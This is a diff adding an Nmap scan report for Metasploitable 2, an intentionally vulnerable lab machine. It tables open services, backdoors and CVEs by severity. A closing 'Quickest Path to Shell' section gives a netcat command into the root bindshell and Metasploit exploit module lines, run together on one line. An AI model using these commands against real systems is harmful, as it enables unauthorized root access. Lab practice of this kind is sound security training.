@@ -1,0 +1,44 @@
+Nmap Scan Results — 192.168.1.3
+Host: metasploitable.localdomain | OS: Linux 2.6.9–2.6.33 | MAC: 08:00:27:41:9D:34 (VirtualBox) | Latency: 1.7ms
+This is Metasploitable 2 — an intentionally vulnerable machine with numerous critical attack surfaces.
+Open Ports & Services
+Port	Service	Version	Notes
+21/tcp	FTP	vsftpd 2.3.4	Anonymous login allowed — BACKDOORED
+22/tcp	SSH	OpenSSH 4.7p1	Very old, Debian
+23/tcp	Telnet	Linux telnetd	Cleartext credentials
+25/tcp	SMTP	Postfix	SSLv2 enabled, VRFY allowed
+53/tcp	DNS	BIND 9.4.2	Old, potentially vulnerable
+80/tcp	HTTP	Apache 2.2.8 + DAV/2	Metasploitable2 web app
+111/tcp	RPC	rpcbind 2	NFS exposed
+139/445/tcp	SMB	Samba 3.0.20-Debian	CVE-2007-2447 (usermap script RCE)
+512/tcp	rexec	netkit-rsh	Legacy r-services
+513/tcp	rlogin	—	No auth required
+514/tcp	rsh	tcpwrapped	Legacy r-services
+1099/tcp	Java RMI	GNU Classpath grmiregistry	RMI exploitation
+1524/tcp	Bindshell	Metasploitable root shell	Direct root shell!
+2049/tcp	NFS	RPC #100003	File share exposure
+2121/tcp	FTP	ProFTPD 1.3.1	Potential mod_copy RCE
+3306/tcp	MySQL	5.0.51a-3ubuntu5	No root password
+3632/tcp	distccd	GNU 4.2.4	CVE-2004-2687 RCE
+5432/tcp	PostgreSQL	8.3.0–8.3.7	Old version, trust auth
+5900/tcp	VNC	Protocol 3.3	Auth enabled
+6000/tcp	X11	—	Access denied
+6667/6697/tcp	IRC	UnrealIRCd 3.2.8.1	BACKDOORED — RCE
+8009/tcp	AJP	Apache JServ 1.3	Ghostcat (AJP)
+8180/tcp	HTTP	Apache Tomcat 5.5	Default creds likely
+8787/tcp	DRb RMI	Ruby 1.8	Remote code execution
+Critical Vulnerabilities Identified
+#	Vulnerability	Port	Severity
+1	vsftpd 2.3.4 Backdoor (CVE-2011-2523)	21	CRITICAL
+2	Open Root Bindshell	1524	CRITICAL
+3	UnrealIRCd 3.2.8.1 Backdoor (CVE-2010-2075)	6667	CRITICAL
+4	Samba usermap script (CVE-2007-2447)	445	CRITICAL
+5	distccd RCE (CVE-2004-2687)	3632	HIGH
+6	Anonymous FTP login	21	HIGH
+7	Tomcat default credentials	8180	HIGH
+8	SSLv2 / expired SSL certs	25, 5432	MEDIUM
+9	SMTP VRFY user enumeration	25	MEDIUM
+10	NFS share exposure	2049	MEDIUM
+Quickest Path to Shell
+The fastest entry points are:
+# 1. Direct root shell — just netcat in:nc 192.168.1.3 1524# 2. vsftpd 2.3.4 backdoor via Metasploit:msf6 > use exploit/unix/ftp/vsftpd_234_backdoor# 3. UnrealIRCd backdoor:msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor# 4. Samba CVE-2007-2447:msf6 > use exploit/multi/samba/usermap_script
